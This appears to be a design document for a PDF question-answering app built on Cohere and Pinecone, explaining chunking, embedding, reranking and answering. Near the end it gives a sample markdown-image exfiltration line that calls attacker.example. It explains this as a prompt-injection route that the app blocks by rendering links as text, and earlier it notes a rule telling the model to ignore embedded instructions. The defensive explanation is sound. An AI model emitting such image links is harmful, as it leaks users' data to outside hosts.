# How it works

## The idea

A language model only knows what was in its training data. It has never seen your PDF, and it can answer with confidence when it is wrong. Retrieval-augmented generation (RAG) fixes this by finding the relevant passages first and then asking the model to answer from them. The model is the student in an open-book exam, and the passages are the pages it is allowed to use.

There are two phases. Indexing happens once for each document. Answering happens for every question.

## Indexing

1. **Read.** `rag/pdf.py` opens the PDF with PyMuPDF and takes the text blocks of every page. Blocks keep paragraphs apart, and they stay in the order the file stores them, which follows the reading order of well-formed files. A scan has no text, so it is refused with a message that says so.
2. **Chunk.** `rag/chunking.py` splits each paragraph into sentences, skipping abbreviations such as "e.g." and "Fig.", and packs sentences into chunks of at most 1,000 characters. The last sentences of a chunk (up to 150 characters) start the next one. A sentence longer than a chunk is cut at word boundaries. Each chunk records the first and last page of its new sentences.
3. **Embed.** `rag/cohere_service.py` sends the chunks to Cohere in batches of 96 with `input_type="search_document"` and gets back 1,024 numbers for each. The model is trained so that a question lands near the passages that answer it, which is why the question later uses `search_query`.
4. **Store.** `rag/vector_store.py` writes the vectors, the chunk text and the page range into a Pinecone namespace named like `s1793205131-a1b2c3`. The number is the creation time, so old namespaces can be found and removed. The app waits until Pinecone reports that the vectors are visible, because a new serverless index can take a few seconds.

## Answering

1. **Rewrite (follow-ups only).** If the chat already has turns, the model rewrites the question so it can be understood alone. "And the overlap?" becomes something like "How much do neighbouring chunks overlap?". The first question is never rewritten.
2. **Search.** The question is embedded and Pinecone returns the 10 nearest chunks by cosine similarity. This is fast, but the question and each chunk were turned into vectors separately, so the match is rough.
3. **Rerank.** Cohere's reranker reads the question and each of the 10 chunks together and scores how well each one answers it. The best 3 are kept. Chunks scoring below `RAG_MIN_RELEVANCE` are dropped, and if none are left the app says it found nothing.
4. **Answer.** The 3 chunks go to Command R+ as `documents`, with an instruction to answer only from them, to say so when the answer is missing, and to ignore any instructions found inside them. The response can carry citations that point at the chunks it used.
5. **Show.** The answer is displayed with its sources: page numbers, relevance scores and a mark on the cited chunks. Links and images in the model's text are shown as plain text.

## Which kind of RAG is this

| Kind | Here? | Note |
|---|---|---|
| Naive RAG (retrieve, paste, generate) | Yes, as the base | |
| Advanced RAG (rerank, better chunking, query rewriting) | Yes | Reranking, overlap with page tracking, follow-up rewriting |
| Hybrid search (vectors plus keywords) | No | Dense search only |
| Agentic RAG (the model plans and loops) | No | One fixed pass per question |
| Graph RAG | No | |
| Multi-document or metadata filters | No | One document per session |

## Choices worth knowing

- **Why 1,000 characters and 10 then 3?** They are the values the original project used, and they are settings. Smaller chunks give sharper matches and less context for the model. Larger chunks do the opposite. Use `eval/run_eval.py` on your own questions before changing them.
- **Why rewrite follow-ups instead of sending the whole chat to the search?** Embedding a whole conversation blurs the meaning of the last question. One short standalone question searches better, at the price of one extra model call.
- **Why a namespace per document?** It keeps documents apart without filters, deleting one is a single call, and it does not use up the small number of indexes a free plan allows.
- **Why is the answer rendered with links disabled?** The document controls part of what the model reads. A markdown image such as `![x](https://attacker.example/p.png?d=SECRET)` makes the browser fetch that address when the answer is displayed, which can leak data. Showing links and images as text closes that route.

## What it does not do

It does not read scans, preserve tables, search several documents at once, or prove that an answer is true. It tells the model to stay inside the retrieved text and shows the sources so that you can check.
